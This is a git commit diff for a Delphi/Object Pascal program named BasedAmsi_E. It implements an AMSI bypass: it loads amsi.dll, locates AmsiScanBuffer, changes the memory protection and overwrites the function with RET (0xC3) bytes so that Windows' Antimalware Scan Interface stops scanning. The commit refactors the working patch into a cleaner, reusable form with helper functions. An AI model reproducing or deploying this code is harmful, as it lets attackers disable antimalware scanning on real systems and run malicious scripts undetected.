ee32302d9dacfa7d71ae086b6e16e041f5d2f350
p4yl0ad <p4yl0ad@protonmail.com>
2021-07-26 21:29:58 +0100

    finished objective style

--- Experiments/BasedAmsi_E/BasedAmsi_E.dpr
+++ Experiments/BasedAmsi_E/BasedAmsi_E.dpr
@@ -2,27 +2,23 @@ program BasedAmsi_E;
 
 {$APPTYPE CONSOLE}
 
-{$R *.res}
+{
+P/Invoke AmsiScanBuffer RET patch written in Object Pascal
+p4yl0ad
 
-
-
+Inspo/Src
+https://github.com/rasta-mouse
+https://stackoverflow.com/questions/37380445/write-the-memory-of-my-own-process-without-using-writeprocessmemory
+http://www.delphigroups.info/2/04/106991.html
+}
 
 uses
-  SysUtils,
-  Windows
-  ;
+  SysUtils, Windows;
 
-var
-  lib : THandle;
-  asb : Pointer;
-  SizeTee, SizeTeeArr : SIZE_T;
-  OldProtect, NewProtect : DWORD;
-  //PatBy : Byte;
 
-  //
-  //PatArr : array[0..15] of Byte = ($4141414141414141);
+const
+  Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
 
-{https://stackoverflow.com/questions/37380445/write-the-memory-of-my-own-process-without-using-writeprocessmemory}
 function WriteBytes(pAddress: Pointer; Bytes: Array of Byte): Boolean;
 var
   OldProtect , NewProtect : DWORD;
@@ -37,56 +33,28 @@ begin
   Result := False;
 end;
 
-const
-  Ass : Array[0..7] of byte = ($c3,$c3,$c3,$c3,$c3,$c3,$c3,$c3);
-  //Pat : Byte = ($C3);
+
+function LoadAndFind(libtofind: PWideChar ): Pointer;
+var
+  lib : THandle;
+  asb : Pointer;
 
 begin
+  lib := LoadLibrary(libtofind);
+  if (lib <> 0) then begin
+    asb := GetProcAddress(lib,'AmsiScanBuffer');
+    WriteLn(Format('[+] dll base address: %p',[asb]));
+    Result := asb;
+  end;
+end;
+
+
+begin
+var
+  asbres : Pointer;
 try
-  //load and find binary
-  lib := LoadLibrary('amsi.dll');
-  asb := GetProcAddress(lib,'AmsiScanBuffer');
-  WriteLn(Format('[+] dll base address: %p',[asb]));
-
-  //Change prots and write
-  WriteBytes(asb,Ass);
-  WriteLn('test');
-
-
-
-
-
-
-
-
-
-
-  //PatBy := ($C3);
-  //SizeTee := SizeOf($C3);
-  //SizeTeeArr := SizeOf(PatArr);
-
-
-
-  //Protect
-  //if VirtualProtect(asb, SizeTee, PAGE_EXECUTE_READWRITE, OldProtect);
-  //WriteLn('Test1');
-
-
-  //Write
-  //Move(PatBy, asb, SizeTee);
-
-  //WriteLn('Test2');
-
-
-
-
-  //Reprotect
-  //VirtualProtect(asb, SizeTee, PAGE_EXECUTE_READ, NewProtect);
-  //WriteLn('Test3');
-  //WriteLn('Test4');
-
-
-
+  asbres := LoadAndFind('amsi.dll');
+  WriteBytes(asbres,Ass);
   except
     on E: Exception do
       Writeln(E.ClassName, ': ', E.Message);
